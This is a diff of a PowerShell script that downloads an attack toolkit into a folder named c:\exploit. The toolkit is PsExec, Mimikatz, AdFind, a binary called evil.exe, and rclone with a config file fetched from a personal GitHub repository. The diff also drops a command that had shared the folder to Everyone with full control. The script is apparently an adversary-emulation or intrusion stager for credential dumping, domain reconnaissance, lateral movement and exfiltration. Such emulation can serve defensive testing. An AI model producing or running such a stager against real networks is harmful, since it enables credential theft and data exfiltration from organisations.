@@ -1,25 +1,23 @@
 "Downloading PsExec"
-
 $staticPath= "c:\exploit"
-net share ShareName=$staticPath /grant:Everyone,FULL
-
 $pstoolsUrl = 'https://download.sysinternals.com/files/PSTools.zip'
 $outputPath = $staticPath+'\PSTools.zip'
 $pstoolsPath = $staticPath+'\PSTools'
 Invoke-WebRequest -Uri $pstoolsUrl -OutFile $outputPath
 Expand-Archive -Path $outputPath -DestinationPath $pstoolsPath
+
 "Downloading Mimikatz"
 $mimikatzUrl = 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip'
 $outputPath = $staticPath+'\mimikatz.zip'
 $mimikatzPath = $staticPath+'\mimikatz'
 Invoke-WebRequest -Uri $mimikatzUrl -OutFile $outputPath
 Expand-Archive -Path $outputPath -DestinationPath $mimikatzPath
+
 "Downloading AdFind"
 $adfindUrl = "https://www.joeware.net/downloads/dl2.php"
 $outputPath = $staticPath+"\adfind.zip"
 $adfindPath = $staticPath+"\adfind"
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$session.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
 Invoke-WebRequest -UseBasicParsing -Uri "https://www.joeware.net/downloads/dl2.php" `
 -Method "POST" `
 -WebSession $session `
@@ -44,13 +42,8 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://www.joeware.net/downloads/dl2.p
 Expand-Archive -Path $outputPath -DestinationPath $adfindPath
 
 
-"Checking up the domain"
-
-
-
-"downloading evil.exe"
+"Downloading evil.exe"
 $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$session.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
 Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/evil.exe" `
 -WebSession $session `
 -Headers @{
@@ -66,6 +59,8 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/Dolev
   "sec-ch-ua-mobile"="?0"
   "sec-ch-ua-platform"="`"macOS`""
 } -OutFile c:\exploit\evil.exe
+
+"Downloading Rclone"
 Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/rclone.exe" `
 -WebSession $session `
 -Headers @{
@@ -81,6 +76,8 @@ Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/Dolev
   "sec-ch-ua-mobile"="?0"
   "sec-ch-ua-platform"="`"macOS`""
 } -OutFile c:\exploit\rclone.exe
+
+"Downloading Rclone Config"
 Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/rclone.conf" `
 -WebSession $session `
 -Headers @{
